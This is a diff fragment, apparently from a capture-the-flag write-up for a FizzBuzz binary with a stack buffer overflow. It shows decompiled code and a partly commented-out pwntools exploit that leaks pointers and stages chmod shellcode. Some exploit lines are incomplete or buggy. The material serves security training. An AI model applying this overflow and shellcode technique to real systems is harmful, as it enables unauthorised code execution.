@@ -13860,44 +13860,44 @@ We see that `main()` calls `challenge()`.
 __int64 challenge()
 {
   __int64 result; // rax
-  char *buf[14]; // [rsp+20h] [rbp-70h] BYREF
+  char *arr[14]; // [rsp+20h] [rbp-70h] BYREF
 
   memset(buffer, 0, 0x68uLL);
-  buf[12] = (char *)buffer + 4;
-  buf[11] = (char *)&buf[2] + 4;
-  HIDWORD(buf[10]) = 0;
-  LODWORD(buf[0]) = 16;
-  strcpy((char *)&buf[9] + 4, "Buzz\n");
+  arr[12] = (char *)buffer + 4;
+  arr[11] = (char *)&arr[2] + 4;
+  HIDWORD(arr[10]) = 0;
+  LODWORD(arr[0]) = 16;
+  strcpy((char *)&arr[9] + 4, "Buzz\n");
   puts("Welcome to Fizz Buzz!");
-  for ( HIDWORD(buf[10]) = 0; ; ++HIDWORD(buf[10]) )
+  for ( HIDWORD(arr[10]) = 0; ; ++HIDWORD(arr[10]) )
   {
-    result = LODWORD(buf[0]);
-    if ( SHIDWORD(buf[10]) >= SLODWORD(buf[0]) )
+    result = LODWORD(arr[0]);
+    if ( SHIDWORD(arr[10]) >= SLODWORD(arr[0]) )
       break;
-    if ( SHIDWORD(buf[10]) % 15 )
+    if ( SHIDWORD(arr[10]) % 15 )
     {
-      if ( SHIDWORD(buf[10]) % 3 )
+      if ( SHIDWORD(arr[10]) % 3 )
       {
-        if ( SHIDWORD(buf[10]) % 5 )
-          buf[11] = (char *)&nothing;
+        if ( SHIDWORD(arr[10]) % 5 )
+          arr[11] = (char *)&nothing;
         else
-          buf[11] = (char *)&buf[9] + 4;
+          arr[11] = (char *)&arr[9] + 4;
       }
       else
       {
-        buf[11] = fizz;
+        arr[11] = fizz;
       }
     }
     else
     {
-      buf[11] = (char *)&fuzzbuzz;
+      arr[11] = (char *)&fuzzbuzz;
     }
-    printf("%d: ", HIDWORD(buf[10]));
-    read(0, (char *)&buf[2] + 4, 0x100uLL);
-    printf("You entered: %s\n", (const char *)&buf[2] + 4);
-    BYTE4(buf[2]) = 0;
-    strcpy(buf[12], buf[11]);
-    printf("Correct answer: %s\n", buf[12]);
+    printf("%d: ", HIDWORD(arr[10]));
+    read(0, (char *)&arr[2] + 4, 0x100uLL);
+    printf("You entered: %s\n", (const char *)&arr[2] + 4);
+    BYTE4(arr[2]) = 0;
+    strcpy(arr[12], arr[11]);
+    printf("Correct answer: %s\n", arr[12]);
   }
   return result;
 }
@@ -14218,6 +14218,97 @@ p.send(payload)
 # v_12_ptr = u64(v_12_ptr_raw.ljust(8, b"\x00"))
 # log.success(f"v[12] pointer raw: {v_12_ptr}")
 # log.success(f"v[12] pointer hex: {hex(v_12_ptr)}")
+
+
+# # ---- Stage 3: shellcode ----
+# shellcode_asm = """
+#    /* chmod("z", 0004) */
+#    push 0x5a
+#    push rsp
+#    pop rdi
+#    pop rax
+#    mov sil, 0x4
+#    syscall
+# """
+# shellcode_addr = v_12_ptr - 16
+# shellcode = asm(shellcode_asm)
+# len_shellcode = len(shellcode)
+
+# # Craft payload
+# payload = shellcode
+# payload = b"A" * (offset_to_counter - len_shellcode)
+# payload += p64(counter_value)
+# payload += b"B" * 8
+# payload += p64(shellcode_addr)
+
+# # Send payload
+# p.send(payload)
+
+p.interactive()
+```
+
+```py
+from pwn import *
+
+context.arch = "amd64"
+
+# Initialize data
+buffer_addr = 0x7ffded2c72f4
+# counter_value = 0xfffffffffffffffb          # -20
+counter_value = 0xfffffffb
+counter_addr = 0x7ffded2c7334
+arr_11_ptr_addr = 0x7ffded2c7338
+arr_12_ptr_addr = 0x7ffded2c7340
+addr_to_saved_ip = 0x7ffded2c7358
+offset_to_counter = (counter_addr - buffer_addr)                    # 64 bytes
+offset_to_arr_11_ptr = arr_11_ptr_addr - (counter_addr + 4)         # 
+offset_t0_arr_12_ptr = arr_12_ptr_addr - (arr_11_ptr_addr + 8)
+offset_to_ret = addr_to_saved_ip - (arr_12_ptr_addr + 8)
+
+p = process("/challenge/can-it-fizz")
+
+# ---- Stage 1: arr[11] leak ----
+p.recvuntil(b"0: ")
+
+# Craft payload
+payload = b"A" * 4                                              # arr[2] Last 4 bytes
+payload += b"B" * (offset_to_counter - (4 + 4 + 4 + 4))         # arr[3] ... arr[8] 48 bytes
+payload += b"C" * 4                                             # arr[9] First 4 bytes
+payload += b"BUFF"                                              # arr[9] Last 4 bytes "Buzz"
+# payload += p64(counter_value)                                   # arr[10] 8 bytes (HIDWORD)
+payload += b"DDDD"
+payload += p32(counter_value)
+
+# Send payload
+p.send(payload)
+
+# # Extract relevant pointer
+# p.recvuntil(b"\xfb\xff\xff\xff")
+# arr_11_ptr_raw = p.recv(6)
+# arr_11_ptr = u64(arr_11_ptr_raw.ljust(8, b"\x00"))
+# log.success(f"arr[11] pointer raw: {arr_11_ptr}")
+# log.success(f"arr[11] pointer hex: {hex(arr_11_ptr)}")
+
+
+# # ---- Stage 2: arr[12] leak ----
+# # Craft payload
+# payload = b"A" * 4                                      # arr[2] Last 4 bytes
+# payload += b"B" * (offset_to_counter - (4 + 8))         # arr[1] ... arr[8] All 8 bytes
+# payload += b"C" * 4                                     # arr[9] First 4 bytes
+# payload += b"BUZZ"                                      # arr[9] Last 4 bytes
+# payload += b"D" * 4                                     # arr[10] First 4 bytes
+# payload += p32(counter_value)                           # arr[10] Last 4 bytes
+# payload += p64()
+
+# # Send payload
+# p.send(payload)
+
+# # Extract relevant pointer
+# p.recvuntil(b"BBBBBBBB")
+# v_12_ptr_raw = p.recv(6)
+# v_12_ptr = u64(v_12_ptr_raw.ljust(8, b"\x00"))
+# log.success(f"arr[12] pointer raw: {v_12_ptr}")
+# log.success(f"arr[12] pointer hex: {hex(v_12_ptr)}")
 
 
 # # ---- Stage 3: shellcode ----
